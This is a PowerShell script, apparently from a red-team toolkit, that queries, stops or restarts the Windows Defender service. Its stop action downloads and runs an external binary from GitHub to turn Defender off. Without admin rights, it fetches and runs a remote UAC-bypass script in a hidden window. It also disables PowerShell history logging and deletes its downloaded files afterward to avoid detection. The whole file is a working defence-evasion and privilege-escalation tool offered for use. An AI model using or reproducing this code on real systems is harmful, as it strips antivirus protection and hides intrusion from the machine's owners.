<#
.SYNOPSIS
   Disable Windows Defender Service (WinDefend) 

   Author: @Sordum (RedTeam) | @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Invoke-WebRequest {native}, dControl.zip {auto-download}
   Optional Dependencies: UacMe.ps1 {auto-download}
   PS cmdlet Dev version: v2.2.6

.DESCRIPTION
   This CmdLet Query, Stops, Start Anti-Virus Windows Defender
   service without the need to restart or refresh target machine.

.NOTES
   This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
   If DisableDefender its executed without administrator privileges!

.Parameter Action
   Accepts arguments: Query, Stop, Start (default: Query)

.Parameter Delay
   Time (sec) to update the service state (default: 4)

.Parameter ServiceName
   Windows Defender Service Name (default: WinDefend)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Query
   Querys the Windows Defender Service State

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Start
   Starts the Windows Defender Service (WinDefend)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Stop
   Stops the Windows Defender Service (WinDefend)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 3
   Give some time (sec) to update the service state (default: 4)

.INPUTS
   None. You cannot pipe objects into DisableDefender.ps1

.OUTPUTS
   Disable Windows Defender Service
   --------------------------------
   ServiceName      : WinDefend
   AMRversion       : 4.18.2104.14
   StartType        : Automatic
   CurrentStatus    : Running
   CanStop          : True
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ServiceName="WinDefend",
   [string]$Action="Query",
   [int]$Delay='4'
)


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null
## Local variable declarations { Cmdlet Internal Settings }
$Working_Directory = pwd|Select-Object -ExpandProperty Path
$Patched = (Get-MpComputerStatus -EA SilentlyContinue).AMProductVersion
If($Delay -lt 3 -or $Delay -gt 6){[int]$Delay='4'} ## min\max delay value accepted
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")


If($Action -ieq "Query"){## Query Windows Defender state

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Query Windows Defender Service State

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Query

   .OUTPUTS
      Disable Windows Defender Service
      --------------------------------
      ServiceName      : WinDefend
      AMRversion       : 4.18.2104.14
      StartType        : Automatic
      CurrentStatus    : Running
      CanStop          : True
   #>

   ## Local function variable declarations
   $State = Get-Service -Name "$ServiceName" -EA SilentlyContinue
   $stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
   $CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status
   $StopType = (Get-Service $ServiceName -EA SilentlyContinue).CanStop

   ## Build Output Table
   Write-Host "`nDisable Windows Defender Service" -ForegroundColor Green
   Write-Host "--------------------------------";Start-Sleep -Seconds 1
   echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
   echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
   echo "StartType        : $stype" >> $Env:TMP\qwerty.log
   echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
   echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
   echo "" >> $Env:TMP\qwerty.log
   Get-Content -Path "$Env:TMP\qwerty.log"

   ## Clean artifacts left behind and exit script
   Remove-Item -Path "$Env:TMP\qwerty.log" -Force
   exit ## Exit @DisableDefender

}


If($Action -ieq "Stop"){

   <#
   .SYNOPSIS
      Author: @Sordum (RedTeam) | @r00t-3xp10it
      Helper - Stops Windows Defender Service

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Stop

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 2
   #>


   ## Download ALL required files from GitHub!
   If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/DWD/dControl.zip" -OutFile "$Env:TMP\dControl.zip" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
         Write-Host "[error] failed to download $Env:TMP\dControl.zip" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }
   }


   If($IsClientAdmin -eq $True){## Shell running under Admin privileges

      ## Expand ZIP archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){
         cd $Env:TMP;.\dControl.exe /D
         ## Return to @redpill working directory!
         cd $Working_Directory
      }Else{## [error] binary file not found!
         Write-Host "[error] not found: $Env:TMP\dControl.exe" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force

 
   }Else{## [error] Shell running under 'UserLand' Privileges


      ## Download required files from GitHub!
      If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
         If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
            Write-Host "[error] failed to download $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
            Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
         }
      }

      ## Expand ZIP archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
         powershell -WindowStyle Hidden -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "$Env:TMP\dControl.exe /D"
      }Else{## [error] file not found!
         Write-Host "[error] not found: $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force       

   }

}


If($Action -ieq "Start"){

   <#
   .SYNOPSIS
      Author: @Sordum (RedTeam) | @r00t-3xp10it
      Helper - Starts Windows Defender Service

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Start

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Start -Delay 2
   #>


   ## Download required files from GitHub!
   If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/DWD/dControl.zip" -OutFile "$Env:TMP\dControl.zip" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
         Write-Host "[error] failed to download $Env:TMP\dControl.zip" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }
   }


   If($IsClientAdmin -eq $True){## Shell running under Admin privileges

      ## Expand archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){
         cd $Env:TMP;.\dControl.exe /E
         ## Return to @redpill working directory!
         cd $Working_Directory
      }Else{## [error] binary file not found!
         Write-Host "[error] not found: $Env:TMP\dControl.exe" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force


   }Else{## [error] Shell running under 'UserLand' Privileges
 

      ## Download required files from GitHub!
      If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
         If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
            Write-Host "[error] failed to download $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
            Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
         }
      }

      ## Expand ZIP archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
         powershell -WindowStyle Hidden -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "$Env:TMP\dControl.exe /E"
      }Else{## [error] file not found!
         Write-Host "[error] not found: $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force

   }

}


## Local function variable declarations
Start-Sleep -Seconds $Delay ## Give time to update service state
$stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
$CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status

## Build Output Table
Write-Host "Disable Windows Defender Service" -ForegroundColor Green
Write-Host "--------------------------------"
echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
echo "StartType        : $stype" >> $Env:TMP\qwerty.log
echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
echo "" >> $Env:TMP\qwerty.log
Get-Content -Path "$Env:TMP\qwerty.log"
Remove-Item -Path "$Env:TMP\qwerty.log" -Force


## Clean Artifacts left behind
If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
   Remove-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue -Force
}
If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
   Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
}
If(Test-Path -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue){
   Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
}
If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){Start-Sleep -Seconds 3
   Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force
}

exit